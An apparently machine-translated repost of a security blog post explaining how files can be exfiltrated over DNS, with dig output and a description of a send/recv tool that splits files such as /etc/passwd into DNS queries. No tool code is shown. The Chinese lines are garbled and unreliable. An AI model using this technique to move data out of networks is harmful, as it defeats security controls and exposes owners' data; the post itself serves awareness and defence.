<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>使用DNS exfiltrate文件 Exfiltrate Files Using the DNS</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script>
<script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">Exfiltrate Files Using the DNS<br/>使用DNS exfiltrate文件 </h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2021-04-01 23:49:52</div><div class="page_narrow text-break page_content"><p>Once upon a time, a government auditor insisted to me that keystroke loggers had to run as root, otherwise they would not function properly. So, I wrote a keystroke logger that ran as a normal user and showed it to him.</p><p>曾几何时，政府审计员坚持给我坚持认为，击键记录器必须以root身份运行，否则它们无法正常运行。所以，我写了一个击键记录器，作为一个普通用户并向他展示。</p><p> He wasn’t amused. He said that I was violating government IT policy by demonstrating the program to him.</p><p> 他没有被逗乐。他说，我违反了政府的IT政策，通过向他展示该计划。</p><p> Some time later, another auditor was adamant that I would not be able to copy files from his  secure enclave computers onto the Internet. He said that he had strong network security measures in place. So, I wrote another small program to copy files from his enclave computers onto the Internet.</p><p> 一段时间后，另一个审计员坚持认为，我无法将文件从他的安全飞离电脑复制到互联网上。他说他有强大的网络安全措施。所以，我写了另一个小程序，将文件从他的飞机计算机复制到互联网上。</p><p> He wasn’t amused either, but was far more appreciative when I showed him how it worked.</p><p> 当我向他展示了它的工作时，他也没有被逗乐，但更欣赏。</p><p>  While I no longer publish the keystroke logger source code, I do publish the  dns-exfil source code.</p><p>  虽然我不再发布击键记录记录器源代码，但我发布了DNS-exfil源代码。</p><p>  Because many security professionals fail to consider the DNS as a mechanism to exfiltrate data. The DNS is also mature, very reliable and relatively fast.</p><p>  由于许多安全专业人员未能将DNS视为抵消数据的机制。 DNS也成熟，非常可靠，相对较快。</p><p>    Recursive DNS servers sit close to end-users. They are typically controlled by the local network administrators or by large providers such as Google or Cloudflare. They answer DNS queries from client computers, phones and tablets in a timely fashion. That is their sole purpose in this world. This allow users to get to  example.com quickly.</p><p>    递归DNS服务器靠近最终用户。它们通常由本地网络管理员或大型提供商（如Google或CloudFlare）控制。他们及时回答来自客户计算机，手机和平板电脑的DNS查询。这是他们在这个世界的唯一目的。这允许用户快速到达example.com。 </p><p> Recursive DNS servers, normally, cache answers so that when another client asks for example.com, the subsequent answer will be even faster as it will be served from the cache (if the record’s TTL has not expired).</p><p>递归DNS服务器，通常，缓存答案，以便当另一个客户端询问exally.com时，随后的答案将更快，因为它将从缓存服务（如果记录的TTL尚未过期）。</p><p> What happens when the recursive resolver doesn’t have the answer cached? Then, it does a lookup to find the authoritative DNS server(s) for the zone and asks one of them.  “Hey, Where is xyz.example.com at?&#34;</p><p> 递归解析器没有答案缓存时会发生什么？然后，它确实查找区域的权威DNS服务器并询问其中一个。 “嘿，xyz.example.com在哪里？＆＃34;</p><p> Authoritative DNS servers are controlled by people/orgs on the Internet. Anyone with a domain name has Authoritative DNS servers that they control.</p><p> 权威DNS服务器由互联网上的人/组织控制。具有域名的任何人都有他们控件的权威DNS服务器。</p><p>  The first field of the SOA record is the primary authoritative DNS server for the domain.</p><p>  SOA记录的第一个字段是域的主要权威DNS服务器。</p><p> $ dig +short SOA facebook.coma.ns.facebook.com. dns.facebook.com.  1617231193  14400  1800  604800  300$ dig +short SOA google.comns1.google.com. dns-admin.google.com.  365995851  900  900  1800  60$ dig +short SOA exfil.go350.comgen.go350.com. brad.go350.com.  1  7200  3600  1209600  3600</p><p> $ dig + shoot soa facebook.coma.ns.facebook.com。 dns.facebook.com。 1617231193 14400 1800 604800 300 $ DIG + SHORT SOA Google.comns1.google.com。 dns-admin.google.com。 365995851 900 900 1800 60 $ DIG + SHORT SOA EXFIL.GO350.CON.GO350.com。 brad.go350.com。 1 7200 3600 1209600 3600</p><p> You can replace  SOA with  NS to see more authoritative servers than what is listed in the SOA record. Organizations typically have two or more.</p><p> 您可以使用NS替换SOA以查看比SOA记录中列出的更多权威服务器。组织通常有两个或更多。</p><p>   $ dig A xyz.example.com; &lt;&lt;&gt;&gt; DiG 9.11.5-P4-5.1+deb10u3-Debian &lt;&lt;&gt;&gt; A xyz.example.com;; global options: +cmd;; Got answer:;; -&gt;&gt;HEADER &lt;&lt;- opcode: QUERY, status: NXDOMAIN, id:  39455;; flags: qr rd ra ad; QUERY: 1, ANSWER: 0, AUTHORITY: 1, ADDITIONAL:  1;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp:  4096;; QUESTION SECTION:;xyz.example.com.		IN	A;; AUTHORITY SECTION:example.com.		3177	IN	SOA	ns.icann.org. noc.dns.icann.org.  2021022314  7200  3600  1209600  3600;; Query time:  0 msec;; SERVER: 173.255.212.5#53 (173.255.212.5 );; WHEN: Wed Mar  31 23:43:27 UTC  2021;; MSG SIZE rcvd:  100</p><p>   $挖一个Xyz.example.com; ＆lt;＆gt;＆gt;挖掘9.11.5-P4-5.1 + DEB10U3-DEBIAN＆lt;＆gt;＆gt;一个xyz.example.com ;;全球选项：+ CMD ;;得到了答案:;; - ＆gt;＆gt;标题＆lt;＆lt;  - 操作码：查询，状态：nx域，ID：39455 ;;标志：QR RD RA广告;查询：1，答案：0，权限：1，附加：1 ;;选择伪坐： EDNS：版本：0，标志：; UDP：4096 ;;问题部分：Xyz.example.com。在一个;;权限部分：example.com。 3177在soa ns.icann.org中。 noc.dns.icann.org。 2021022314 7200 3600 1209600 3600 ;;查询时间：0毫秒;;服务器：173.255.212.5＃53（173.255.212.5）;时间：3月31日星期三23:43:27 UTC 2021 ;; MSG大小RCVD：100 </p><p> Using the above dig of  xyz.example.com, we can see that the client computer (on some corporate network) just sent the data  xyz to a DNS server somewhere on the Internet that is authoritative for the zone  example.com.</p><p>使用上面的Xyz.example.com的DIG，我们可以看到客户端计算机（在某些公司网络上）刚刚将数据XYZ发送到Internet上的某处的DNS服务器，该服务器对域example.com是权威的。</p><p> What if  xyz was a small part of some file on the client computer (say /etc/passwd)? What if lots of DNS queries were sent with file markers and indexes? Enough DNS queries to reorder and reassemble the entire file?</p><p> 如果XYZ是客户端计算机上的某些文件的一小部分（例如/ etc / passwd）怎么办？如果用文件标记和索引发送了许多DNS查询，则何时何地？足够的DNS查询重新排序并重新组装整个文件？</p><p>    send - runs on a client computer, breaking up files and sending them to the DNS server disguised as actual DNS queries.</p><p>    发送 - 在客户端计算机上运行，​​打破文件并将其发送到DNS服务器伪装为实际DNS查询。</p><p> recv - runs on the DNS server reassembling the files from the DNS query log.</p><p> recv  - 在DNS服务器上运行从DNS查询日志中重新组装文件。</p><p>  When demonstrating dns-exfil, I check the file’s MD5 sum before sending so I can compare to the reassembled file on the DNS server later.</p><p>  在演示DNS-EXFIL时，我在发送之前检查文件的MD5 SUM，因此我可以将DNS服务器上的重组文件进行比较。</p><p>   The reassembled file has the same MD5 sum as the original file on the client.</p><p>   重新组装的文件与客户端上的原始文件相同的MD5。</p><p>   When I initially wrote  dns-exfil, I used  BIND for the DNS server. However, any authoritative DNS server will do. Today, I use  coredns as it’s easier to setup and more secure.</p><p>   当我最初编写DNS-EXFIL时，我使用了为DNS服务器绑定。但是，任何权威的DNS服务器都将执行。今天，我使用coredns，因为它更容易设置和更安全。 </p><p> The picture at the top is a baby lizard from our garden. He’s climbing up a water hose.</p><p>顶部的图片是我们花园的婴儿蜥蜴。 他正在爬上水管。 </p></div><div id="story_share_this"><div class="sharethis-inline-share-buttons"></div></div><div class="text-break sotry_link page_narrow"><a target="_blank" href="https://www.go350.com/posts/exfiltrate-files-using-the-dns/">https://www.go350.com/posts/exfiltrate-files-using-the-dns/</a></div><div class="story_tags page_narrow"><button type="button" class="btn btn-light my_tag"><a href="/tag/dns/">#dns</a></button><button type="button" class="btn btn-light my_tag"><a href="/tag/files/">#files</a></button></div></div><div class="my_movie_list_item shadow p-3 mb-5 bg-white rounded"><button type="button" class="btn btn-link my_tag"><a href="/tag/web2.0/">#web2.0</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/google/">#google</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/设计/">#设计</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/创意/">#创意</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/摄影/">#摄影</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/图片/">#图片</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/游戏/">#游戏</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/软件/">#软件</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/视频/">#视频</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/手机/">#手机</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/广告/">#广告</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/网站/">#网站</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/iphone/">#iphone</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/免费/">#免费</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/下载/">#下载</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/windows/">#windows</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/微软/">#微软</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/firefox/">#firefox</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/blog/">#blog</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/apple/">#apple</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/音乐/">#音乐</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/苹果/">#苹果</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/博客/">#博客</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/wordpress/">#wordpress</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/恶搞/">#恶搞</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/qq/">#qq</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/艺术/">#艺术</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/web/">#web</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/工具/">#工具</a></button><button type="button" class="btn btn-link my_tag"><a href="/tag/分享/">#分享</a></button></div></div></div><div id="my_footer"><div class=""><a href="/tags/">tags</a> <a href="/users/">users</a></div>&copy;2012-2021 diglog.com </div></div></body></html>